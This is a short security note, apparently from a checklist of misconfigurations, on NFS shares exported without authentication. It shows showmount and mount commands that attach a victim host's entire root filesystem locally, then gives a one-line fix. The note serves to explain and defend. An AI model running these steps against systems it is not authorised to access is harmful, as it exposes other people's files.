
- description:

An attcker could mount victim's NFS shares locally to his machine without authentication


- default port: 2049


- example:

```
$ showmount -e 192.168.43.223
Export list for 192.168.43.223:
/ *

$ mkdir /tmp/victim
$ sudo mount -t nfs 192.168.43.223:/ /tmp/victim
$ df -h
Filesystem        Size  Used Avail Use% Mounted on
.
.
.
192.168.43.223:/  7.0G  1.5G  5.2G  22% /tmp/victim
$ cd /tmp/victim
dofa@dofa-SATELLITE-PRO-L850-1MH:/tmp/victim$ ls
root
bin
tmp
.
.
.
```


- How to solve:

Configure NFS share to only authorize certain users to mount NFS shares
